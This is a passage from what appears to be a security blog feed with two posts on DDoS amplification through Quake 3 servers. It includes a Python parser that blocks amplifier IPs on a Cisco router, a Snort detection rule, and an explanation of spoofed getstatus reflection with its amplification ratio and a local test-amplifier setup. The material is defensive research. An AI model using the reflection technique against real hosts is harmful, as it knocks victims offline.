<p>We are going to need <a href="http://www.secdev.org/projects/scapy/">scapy</a> again as well as <a href="https://github.com/knipknap/exscript/wiki">exscript</a> module to interact with Cisco routers. Then we just need to analyze UDP datagrams and look for &#8220;&#8230;.disconnect&#8221; or &#8220;&#8230;.statusResponse&#8221; in payload content to list Quake 3 servers being used as amplifiers, once done only remains to create access-list entries for those IP address.</p>

<p>Here is an example for doing this process:</p>

<figure class='code'><figcaption><span>quake3_ddos_parser.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c">#coding:utf-8</span>
</span><span class='line'><span class="c"># Author: Alejandro Nolla - z0mbiehunt3r</span>
</span><span class='line'><span class="c"># Purpose: Example for identifying Quake 3 amplifiers and block them with Cisco access-list </span>
</span><span class='line'><span class="c"># Created: 21/06/13</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="kn">from</span> <span class="nn">Exscript.util.interact</span> <span class="kn">import</span> <span class="n">read_login</span>
</span><span class='line'>    <span class="kn">from</span> <span class="nn">Exscript.protocols</span> <span class="kn">import</span> <span class="n">SSH2</span>
</span><span class='line'><span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;You need exscript (https://github.com/knipknap/exscript)&#39;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">logging</span>
</span><span class='line'><span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s">&quot;scapy.runtime&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span> <span class="c"># supress everything below error</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="n">rdpcap</span>
</span><span class='line'><span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;You need scapy (http://www.secdev.org/projects/scapy/)&#39;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">#----------------------------------------------------------------------</span>
</span><span class='line'><span class="k">def</span> <span class="nf">extract_quake3_amplifiers</span><span class="p">(</span><span class="n">pcap_file_path</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    It will classify an IP address as an amplifier if UDP payload</span>
</span><span class='line'><span class="sd">    consists of &quot;....disconnect&quot; or &quot;....statusResponse&quot; command</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @param pcap_file_path: Path to pcap file to parse</span>
</span><span class='line'><span class="sd">    @type pcap_file_path: str</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @return: Set with amplifiers servers</span>
</span><span class='line'><span class="sd">    @rtype: set</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">amplifiers_servers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    rdpcap will read all packets at once, if you need to read</span>
</span><span class='line'><span class="sd">    it sequentially take a look to PcapReader</span>
</span><span class='line'><span class="sd">    http://www.sourcecodebrowser.com/scapy/1.0.2/classscapy_1_1_pcap_reader.html</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="n">pcap_file_path</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="s">&#39;UDP&#39;</span><span class="p">):</span>
</span><span class='line'>            <span class="k">continue</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="s">&#39;Raw&#39;</span><span class="p">):</span>
</span><span class='line'>            <span class="n">raw_udp_payload</span> <span class="o">=</span> <span class="n">packet</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="s">&#39;Raw&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="n">ip_layer</span> <span class="o">=</span> <span class="n">packet</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="s">&#39;IP&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">raw_udp_payload</span><span class="o">.</span><span class="n">load</span> <span class="o">==</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">disconnect&#39;</span> <span class="ow">or</span>\
</span><span class='line'>               <span class="n">raw_udp_payload</span><span class="o">.</span><span class="n">load</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">statusResponse&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="n">amplifiers_servers</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">ip_layer</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">amplifiers_servers</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">PCAP_FILE</span> <span class="o">=</span> <span class="s">&#39;./udp_quake3.pcap.cloaked&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;&#39;&#39;Example of Quake 3 DDoS amplification attack parser to automatically deploy Cisco IOS access-list</span>
</span><span class='line'><span class="s">    - by Alejandro Nolla (z0mbiehunt3r)&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;[*] Parsing </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span><span class="n">PCAP_FILE</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">amplifiers_servers</span> <span class="o">=</span> <span class="n">extract_quake3_amplifiers</span><span class="p">(</span><span class="n">PCAP_FILE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;[+] Got </span><span class="si">%i</span><span class="s"> amplifiers servers being used in the attack...&#39;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span>
</span><span class='line'>                                                                          <span class="n">amplifiers_servers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">account</span> <span class="o">=</span> <span class="n">read_login</span><span class="p">()</span> <span class="c"># read login from prompt</span>
</span><span class='line'>    <span class="n">conn</span> <span class="o">=</span> <span class="n">SSH2</span><span class="p">()</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s">&#39;192.168.1.245&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">account</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">conn</span><span class="o">.</span><span class="n">response</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;config t&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">conn</span><span class="o">.</span><span class="n">response</span>
</span><span class='line'>    <span class="c"># create access-list</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;[!] Deploying access-list, take a coffee...&#39;</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;ip access-list extended quake3_ddos&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">server</span> <span class="ow">in</span> <span class="n">amplifiers_servers</span><span class="p">:</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">        here we directly block IP protocol but we could block UDP for Quake 3</span>
</span><span class='line'><span class="sd">        responses and ICMP protocol for traffic potentially being generated</span>
</span><span class='line'><span class="sd">        for hosts/ports unreachable and so on typical in DDoS attacks</span>
</span><span class='line'><span class="sd">        (backscatter effect)</span>
</span><span class='line'><span class="sd">        </span>
</span><span class='line'><span class="sd">        Also, we could block only ports being used in the attack (game ones, finite)</span>
</span><span class='line'><span class="sd">        &#39;&#39;&#39;</span>
</span><span class='line'>        <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;deny ip host </span><span class="si">%s</span><span class="s"> any&#39;</span> <span class="o">%</span><span class="n">server</span><span class="p">)</span> <span class="c"># add one rule per amplifier</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># caution with implicit deny (legitimate users&#39; traffic, routing protocols, etc)</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;permit ip any any&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># apply access-list to interface</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;interface fastEthernet 1/1&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;ip access-group quake3_ddos in&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># quick&#39;n dirty way for copy running-config startup-config</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;do wr&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">conn</span><span class="o">.</span><span class="n">response</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;exit</span><span class="se">\r</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;[-] SLD-26 shield deployed&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Time to execute it and await, it&#8217;s going to take his time when processing a real DDoS capture (millions of packets), so it&#8217;s highly recommended to make a prior filter with tshark and adapt this script to use multiple CPUs (or programming it in C):</p>

<figure class='code'><figcaption><span>parsing and generating access-list</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python quake3_ddos_parser.py
</span><span class='line'>Example of Quake 3 DDoS amplification attack parser to automatically deploy Cisco IOS access-list
</span><span class='line'>    - by Alejandro Nolla <span class="o">(</span>z0mbiehunt3r<span class="o">)</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Parsing ./udp_quake3.pcap.cloaked
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Got 455 amplifiers servers being used in the attack...
</span><span class='line'>Please enter your user name <span class="o">[</span>z0mbiehunt3r<span class="o">]</span>: cisco
</span><span class='line'>Please enter your password:
</span><span class='line'>
</span><span class='line'>Endor#
</span><span class='line'>config t
</span><span class='line'>Enter configuration commands, one per line.  End with CNTL/Z.
</span><span class='line'>Endor<span class="o">(</span>config<span class="o">)</span><span class="c">#</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Deploying access-list, take a coffee...
</span><span class='line'><span class="k">do </span>wr
</span><span class='line'>Building configuration...
</span><span class='line'><span class="o">[</span>OK<span class="o">]</span>
</span><span class='line'>Endor<span class="o">(</span>config-ext-nacl<span class="o">)</span><span class="c">#</span>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> SLD-26 shield deployed
</span></code></pre></td></tr></table></div></figure>


<p>Now connect to our router and check if everything went ok:</p>

<figure class='code'><figcaption><span>checking access-list for quake 3 amplifiers</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ios'><span class='line'><span class="k">Endor&gt;</span> enable
</span><span class='line'><span class="k">Endor#</span> show ip access-lists quake3_ddos
</span><span class='line'><span class="k">Extended</span> IP access list quake3_ddos
</span><span class='line'><span class="k">  10</span> <span class="ow">deny</span> ip host <span class="m">192.0.2.239</span> any
</span><span class='line'><span class="k">  20</span> <span class="ow">deny</span> ip host <span class="m">128.66.194.14</span> any
</span><span class='line'><span class="k">  30</span> <span class="ow">deny</span> ip host <span class="m">128.66.233.82</span> any
</span><span class='line'><span class="k">  40</span> <span class="ow">deny</span> ip host <span class="m">128.66.186.59</span> any
</span><span class='line'><span class="k">  50</span> <span class="ow">deny</span> ip host <span class="m">128.66.150.252</span> any
</span><span class='line'><span class="k">  [...]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, so it seems access-list was created ok, attack traffic should begin to be dropped (at filtering router) in seconds, time to figure out next attack vector that will try being exploited, attackers will move to another technique for sure.</p>

<h3>Creating a snort rule</h3>

<p>If we have a snort sensor or IPS system we could create specific rules based on detected attack pattern to protect us against analyzed DDoS technique. Anyway, going up to application layer is highly discouraged to mitigate a real DDoS attack because it will require more CPU and RAM to process each packet not only because of unwrapping more layers but because specific &#8220;simple&#8221; filtering actions like filtering on IP addresses and/or ports are performed through packet forwarding hardware (<a href="http://en.wikipedia.org/wiki/Application-specific_integrated_circuit">ASIC</a>) and will be far better than a CPU filtering approach done in most majority of appliances.</p>

<p>For testing purposes I have used a <a href="http://securityonion.blogspot.com.es/">security onion</a> virtual machine with snort and <a href="https://snorby.org/">snorby</a> running for capturing and visualizing alerts respectively. To create a snort rule to detect inbound DDoS amplification attack using Quake 3 servers we are going to look for &#8220;&#8230;disconnect&#8221; (again it works only for analyzed script and should be extended to the others already analyzed caseloads) in UDP payload, now it&#8217;s time to read <a href="http://manual.snort.org/node27.html">&#8220;Writing Snort Rules&#8221;</a>:</p>

<figure class='code'><figcaption><span>detecting attack with snort</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># vim /etc/nsm/rules/local.rules</span>
</span><span class='line'>alert udp any any -&gt; any any <span class="o">(</span>msg:<span class="s2">&quot;Quake 3 DDoS amplification attack INBOUND&quot;</span>; content:<span class="s2">&quot;|ff ff ff ff 64 69 73 63 6f 6e 6e 65 63 74|&quot;</span>; nocase; offset:0; depth:14; sid:1000666; rev:1;<span class="o">)</span>
</span><span class='line'><span class="c"># rule-update</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>alert udp any any -> any any: analyze any source:port to any destination:port if UDP</li>
<li>content: tell snort hex string to search</li>
<li>nocase: in a no case sensitive way</li>
<li>offset: start analyzing in offset 0 for payload</li>
<li>depth: and only up to next 14 bytes (for speed optimization, size of content searched)</li>
</ul>


<p>If we create this rule and use scapy as shown before to send a UDP datagram with this pattern an alert will be triggered and a new event will be shown in our snorby interface:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/08/snorby_rule.png"></p>

<p>If we analyze with attention the previous image we are can see IP ToS, TTL, UDP length and payload as previously analyzed, so it seems our patterns works fine (despited of it should be improved).</p>

<h2>Conclusions</h2>

<p>After spending some weeks researching about this kind of attack vector -using several games servers as amplifiers- I&#8217;m sure it&#8217;s an attack that can be really powerful to launch storms of spoofed UDP datagrams with almost no cost or effort at all, it&#8217;s really easy to get an almost real time updated list of online servers without having to make any kind of port scanning but just parsing online gaming directories and, to make matters worse, amplification factors can be up to several dozens original throughput and, because this kind of attack is less known, IT people will be less aware and ready to face off such techniques.</p>

<p>The fact that this kind of attack is being actively used in DDoS as a service platforms to launch attacks from several web booters makes important to know this attack, how to detect it and how to try to defend against him, so stay alert and see you at next post!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Amplification DDoS attack with Quake3 servers: An analysis (1/2)]]></title>
    <link href="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/"/>
    <updated>2013-06-24T13:52:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>Lately has been growing in popularity those DDoS attacks based on <a href="http://www.us-cert.gov/ncas/alerts/TA13-088A">DNS Amplification</a>, specifically due to the <a href="http://blog.cloudflare.com/the-ddos-that-almost-broke-the-internet">attack</a> to Spamhaus. While this kind of attack is becoming more and more popular at DDoS scenarios there are others types of DDoS techniques being used not so common and which should be known before being hitted by them. In this post i want to introduce amplification attacks using Quake 3 network protocol - UDP based - as well as how to analyze it in several ways to really understand it in depth to find a pattern and create a fingerprint for trying mitigating them. <!-- more --></p>

<h2>How does this attack works</h2>

<p>This kind of DDoS is very similar to a DNS Amplification Attack, an attacker send thousands of UDP datagrams pretending to be a legitimate Quake 3 client asking for game status with source IP address spoofed using the one wanted to be flooded, then, queried Quake 3 servers will answer with game status - including some server configuration options and user list - to spoofed source IP address, flooding it with thousands of unsolicited UDP datagrams.</p>

<p>I have done a basic draw for illustrating it:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/06/quake3_ddos.png"></p>

<p>As shown, amplifiers servers - Quake 3 ones - will flood victim with an aggregated throughput much higher than the used by attacker (hence it &#8220;amplifier&#8221; term); lets see some traffic generated if we make this &#8220;getstatus&#8221; request:</p>

<figure class='code'><figcaption><span>showing some info about getstatus request with tshark </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tshark -r udp_quake3_reflected_clean.pcap.cloaked -z conv,udp
</span><span class='line'>  1   0.000000 192.168.1.39 -&gt; 128.66.0.59  QUAKE3 56 Connectionless Client to Server
</span><span class='line'>  2   0.213635  128.66.0.59 -&gt; 192.168.1.39 QUAKE3 1373 Connectionless Server to <span class="nv">Client</span>
</span><span class='line'><span class="o">================================================================================</span>
</span><span class='line'>UDP Conversations
</span><span class='line'>Filter:&lt;No Filter&gt;
</span><span class='line'>                                               |       &lt;-      | |       -&gt;      | |     Total     |
</span><span class='line'>                                               | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |
</span><span class='line'>192.168.1.39:32511   &lt;-&gt; 128.66.0.59:27960          1      1373       1        56       2      <span class="nv">1429</span>
</span><span class='line'><span class="o">================================================================================</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we calculate amplification ratio we find that sending an UDP datagram of 56 bytes will trigger a response of 1373 bytes, achieving about x24,5 amplification ratio, not bad after all.</p>

<h2>Installing Quake 3 server (amplifier)</h2>

<p>We are going to need a Quake 3 server for being used as &#8220;amplifier&#8221; to attack our victim when doing some local tests, so we are going to need an original copy of Quake 3 and compiling <a href="http://ioquake3.org/">ioquake3</a>, an open source Quake 3 engine based on id Software source code (publicly released in 2005).</p>

<figure class='code'><figcaption><span>installing prerequisites and ioquake3 server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># apt-get install libsdl1.2-dev -y</span>
</span><span class='line'>~<span class="nv">$ </span>git clone git://github.com/ioquake/ioq3.git
</span><span class='line'>~<span class="nv">$ </span><span class="nb">cd </span>ioq3/
</span><span class='line'>~/ioq3<span class="nv">$ </span>make
</span></code></pre></td></tr></table></div></figure>


<p>Now we need to copy Quake 3 original pak files (those with models and textures) from our cdrom to our hdd prior being able to run an ioq3 server:</p>

<figure class='code'><figcaption><span>copying pak files to our hdd and starting ioq3 server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~<span class="nv">$ </span>mkdir .baseq3
</span><span class='line'>/quake3/baseq3<span class="nv">$ </span>cp *.pk3 /home/z0mbiehunt3r/.q3a/baseq3
</span><span class='line'>~<span class="nv">$ </span><span class="c"># now start server</span>
</span><span class='line'>~/ioq3/build/release-linux-x86_64<span class="nv">$ </span>./ioq3ded.x86_64 +set net_ip YOUR_LAN_IP +map q3dm1
</span><span class='line'>ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
</span><span class='line'>Have SSE support
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Hunk_Clear: reset the hunk ok
</span><span class='line'>--- Common Initialization Complete ---
</span><span class='line'>IP: 127.0.0.1
</span><span class='line'>IP: 192.168.1.39
</span><span class='line'>Opening IP socket: 192.168.1.39:27960
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>------------ Map Loading ------------
</span><span class='line'>trying to load maps/q3dm1.aas
</span><span class='line'>loaded maps/q3dm1.aas
</span><span class='line'>found 18 level items
</span><span class='line'>-------------------------------------
</span><span class='line'>32 bots parsed
</span><span class='line'>35 arenas parsed
</span><span class='line'>AAS initialized.
</span><span class='line'>-----------------------------------
</span><span class='line'><span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our ioq3 server is ready to make some frags!, we can check it with <a href="http://nmap.org/nsedoc/scripts/quake3-info.html">quake3-info.nse</a> script:</p>

<figure class='code'><figcaption><span>scanning our Quake 3 server with nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./nmap -sU -p27960 -Pn -n 192.168.1.39 --reason --script=quake3-info</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.26SVN <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2013-06-16 00:23 CEST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.1.39
</span><span class='line'>Host is up, received user-set <span class="o">(</span>0.00021s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE REASON
</span><span class='line'>27960/udp open  quake3  udp-response
</span><span class='line'>| quake3-info:
</span><span class='line'>|   BASIC OPTIONS:
</span><span class='line'>|     capturelimit: 8
</span><span class='line'>|     dmflags: 0
</span><span class='line'>|     fraglimit: 20
</span><span class='line'>|     gamename: baseq3
</span><span class='line'>|     mapname: q3dm1
</span><span class='line'>|     timelimit: 0
</span><span class='line'>|     version: ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
</span><span class='line'>|   OTHER OPTIONS:
</span><span class='line'>|     bot_minplayers: 0
</span><span class='line'>|     com_gamename: Quake3Arena
</span><span class='line'>|     com_protocol: 71
</span><span class='line'>|     g_gametype: 0
</span><span class='line'>|     g_maxGameClients: 0
</span><span class='line'>|     g_needpass: 0
</span><span class='line'>|     sv_allowDownload: 0
</span><span class='line'>|     sv_dlRate: 100
</span><span class='line'>|     sv_floodProtect: 1
</span><span class='line'>|     sv_hostname: c0meG3tS0m3
</span><span class='line'>|     sv_maxPing: 0
</span><span class='line'>|     sv_maxRate: 0
</span><span class='line'>|     sv_maxclients: 8
